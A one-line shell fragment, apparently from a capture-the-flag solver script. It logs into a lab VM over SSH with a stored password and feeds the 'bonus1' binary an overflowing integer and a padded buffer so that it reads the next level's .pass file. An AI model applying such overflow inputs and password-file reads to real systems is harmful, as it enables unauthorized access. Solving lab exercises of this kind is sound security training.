...
flag=$(sshpass -p "${act_bonus_password}" ssh bonus${ACTUAL_BONUS}@${VM_ID} -p 4242 'echo "cat /home/user/bonus2/.pass" | ./bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW' 2> /dev/null)
